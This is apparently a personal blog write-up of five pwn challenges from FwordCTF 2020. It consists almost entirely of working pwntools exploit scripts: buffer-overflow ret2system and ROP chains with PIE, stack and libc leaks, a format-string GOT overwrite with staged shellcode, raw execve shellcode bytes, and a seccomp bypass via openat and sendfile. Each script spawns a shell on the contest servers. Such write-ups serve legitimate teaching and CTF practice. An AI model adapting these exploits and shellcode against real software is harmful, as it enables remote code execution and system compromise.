---
# Documentation: https://sourcethemes.com/academic/docs/managing-content/

title: "Fwordctf Pwn"
subtitle: "Solution for pwn challenges i solved during. CTF"
summary: "Pwn"
authors: [hk]
tags: []
categories: []
date: 2020-08-31T16:55:28+05:30
lastmod: 2020-08-31T16:55:28+05:30
featured: false
draft: false
author:
 - hk
tags:
 - pwn
# Featured image
# To use, add an image named `featured.jpg/png` to your page's folder.
# Focal points: Smart, Center, TopLeft, Top, TopRight, Left, Right, BottomLeft, Bottom, BottomRight.
image:
  caption: ""
  focal_point: ""
  preview_only: false

# Projects (optional).
#   Associate this post with one or more of your projects.
#   Simply enter your project's folder or file name without extension.
#   E.g. `projects = ["internal-project"]` references `content/project/deep-learning/index.md`.
#   Otherwise, set `projects = []`.
projects: []
---

# Challenge - Molotov

### buffer-overflow- ret 2 system.

#### Exploit
```python
#!/usr/bin/python3
from pwn import *
####TL;DR
"""
Buffer-overflow; return 2 system.
"""
####Exploit
io = remote("54.210.217.206",1240)
#io = process(["./molotov"])
system = int(b"0x"+io.recvn(8),0)
libc_base = system-0x0458b0
binsh = libc_base+	0x19042d
print(f"System: {hex(system)}")
ROP  =  b"A"*0x20+p32(system)+b"A"*4+p32(binsh)+b"A"
io.sendline(ROP)
io.interactive()
```


# Challenge - numbers

### Signed integer - buffer overflow

#### Exploit
```python
from pwn import *
exe = context.binary = ELF("./numbers")

####TL;DR
"""
Signed integer can create problems. Negative number - bufferoverflow - leak - shell
"""
####Addr
pop_rdi = 0x00000ad3
pop_rsi = 0x00000ad1
main = 0x00009c5
system = 0x050300
puts = 0x081010
binsh = 0x1aae80
ret = 0x0000070e

####Exploit
#io = process(["./numbers"])
io = remote("numbers.fword.wtf",1237)
io.sendafter("mind ??",str(-1))
ROP1  =  b"A"*0x16+b"BB"
io.sendafter("?\n",ROP1)
io.recvuntil("BB")
pie_base = u64(io.recvn(0x6)+b"\x00\x00")-0x8e9
print(f"Pie base: {hex(pie_base)}")
io.sendafter("?","y")
io.sendafter("mind ??",str(-1))
ROP2 = b"A"*0x3e+b"BB"
io.sendafter("?\n",ROP2)
io.recvuntil("BB")
stack_leak = u64(io.recvn(6)+b"\x00\x00")
print(f"Stack leak: {hex(stack_leak)}")
io.sendafter("?","y")
io.sendafter("mind ??",str(-1))
ROP3  = b"A"*0x40+p64(stack_leak)+p64(pie_base+pop_rdi)+\
	p64(pie_base+exe.got["puts"])+p64(pie_base+exe.sym.puts)+\
	p64(pie_base+pop_rdi)+p64(pie_base+exe.sym.puts)+\
	p64(pie_base+main)
io.sendafter("?\n",ROP3)
io.recvn(0x46)
libc_puts = u64(io.recvn(0x10)[0x0:0x6]+b"\x00\x00")
libc_base = libc_puts-puts
print(f"Libc puts: {hex(libc_puts)}")
print(f"Libc base: {hex(libc_base)}")
io.sendafter("mind ??",str(-1))
ROP4  = b"A"*0x48+p64(pie_base+pop_rdi)+p64(libc_base+binsh)+\
	p64(pie_base+ret)+\
	p64(libc_base+system)
io.sendafter("?\n",ROP4)
io.interactive()
```


# Challenge - one_piece

### Yet another buffer overflow becuse of one byte overflow into size field.

#### Exploit
```python
#!/usr/bin/python3
from pwn import *
exe = context.binary = ELF("./one_piece")

####Addr
pop_rdi = 0x00000ba3
pop_rsi = 0x00000ba1
main = 0x0000b1a
system = 0x0554e0
puts = 0x087490
binsh = 0x1b6613
ret = 0x00000960

####Utils
def rshellcode(shellcode):
	io.sendlineafter(">>","read")
	io.sendafter(">>",shellcode)

def blah():
	io.sendlineafter(">>","gomugomunomi")

####Exploit
#io = process(["./one_piece"])
io = remote("onepiece.fword.wtf",1238)
rshellcode(b"A"*0x27+b"\x7a")
blah()
io.recvuntil("right ? : ")
pie_base = int(b"0x"+io.recvn(12),0)-0xa3a
print(f"Pie base: {hex(pie_base)}")
ROP  =  b"A"*0x38+p64(pie_base+pop_rdi)+\
	p64(pie_base+exe.got["puts"])+p64(pie_base+exe.sym.puts)+\
	p64(pie_base+main)+b"A"
io.recv()
io.sendline(ROP)
io.recvline()
libc_puts = u64(io.recvn(6)+b"\x00\x00")
libc_base = libc_puts-puts
print(f"Libc puts: {hex(libc_puts)}")
print(f"Libc base: {hex(libc_base)}")
rshellcode(b"A"*0x27+b"\x7a")
blah()
io.recv()
ROP2 =  b"A"*0x38+p64(pie_base+pop_rdi)+\
	p64(libc_base+binsh)+p64(pie_base+ret)+\
	p64(libc_base+system)+b"A"
io.sendline(ROP2)
io.interactive()
```


# Challenge - one_piece_remake

### Formatstring bug and also We can execute shellcode. I choose to leak stack, and keep small shellcode which read another shellcode to bss. And call full shellcode. To call shellcode exit() got -> stack address.


#### Exploit
```python
#!/usr/bin/python3
from pwn import *
from formatstring import *
exe = context.binary = ELF("./one_piece_remake")
context.update(arch="i386")

####TL;DR
"""
FSB, Leak stack;
exit() got to stack shellcode addr
Leak stack -> run shellcode on stack to recieve other shellcode store on .bss -> call other shellcode -> shell
"""
####Addr
shellcode_start = 0x804a038

####Exploit
#io = process(["./one_piece_remake"])
io = remote("onepiece.fword.wtf",1236)
io.sendlineafter(">>","gomugomunomi")
settings = PayloadSettings(offset=7,arch=x86_32)
p = WritePayload()
io.sendafter(">>","AAAA|%p")
io.recvuntil("|")
stack_leak = int(io.recvn(10),0)
print(f"Stack leak: {hex(stack_leak)}")
p[exe.got["exit"]] = p32(stack_leak)
io.sendlineafter(">>","gomugomunomi")
io.sendafter(">>",p.generate(settings))
io.sendlineafter(">>","gomugomunomi")
shellcode = asm(f"""
	xor  eax, eax
	mov  al,  3
	xor  ebx, ebx
	mov  ecx, {shellcode_start}
	int  0x80
	inc  ecx
	call ecx
""")
io.sendlineafter(">>",shellcode)
io.sendlineafter(">>","exit")
pause()
shellcode = "A\x31\xc0\x99\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
io.send(shellcode)
io.interactive()
``` 

# Challenge - blacklist
# 
### Statically-linked binary with lots of gadgets. Buffer overflow. But there is seccomp, We can't open - write. I choose to do `openat-sendfile`. ;) 
#### Exploit
```python
#!/usr/bin/python3
from pwn import *

####Addr
pop_rdi = 0x0048005d
pop_rsi = 0x004651ef
pop_rdx = 0x00401db2
pop_rax = 0x00448923
pop_rsp = 0x00473ed4
pop_rcx = 0x00401d6e
pop_r10 = 0x00401db1
syscall = 0x0046a8b5
bss = 0x4d1260


####TL;DR
"""
Statically linked binary, buffer overflow, but seccomp makes life harder. openat to open flag file, and sendfile syscall to get flag.
"""
####Exploit
#io = process(["./blacklist"])
io = remote("blacklist.fword.wtf",1236)
ROP  =  b"A"*0x48+p64(pop_rdi)+p64(0x0)+\
	p64(pop_rsi)+p64(bss)+p64(pop_rdx)+p64(0x1000)+\
	p64(pop_rax)+p64(0x0)+p64(syscall)+p64(pop_rsp)+\
	p64(bss)
io.sendline(ROP)
ROP2 =  p64(pop_rdi)+p64(0x0)+\
	p64(pop_rsi)+p64(0x4d1300)+\
	p64(pop_rdx)+p64(0x0)+\
	p64(pop_rcx)+p64(0x0)+\
	p64(pop_rax)+p64(0x101)+\
	p64(syscall)+p64(pop_rdi)+p64(0x1)+\
	p64(pop_r10)+p64(0xffff)+p64(pop_rsi)+p64(0x3)+\
	p64(pop_rax)+p64(0x28)+p64(syscall)
io.sendline(ROP2+b"/home/fbi/aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacma.txt\x00")
io.interactive()
```

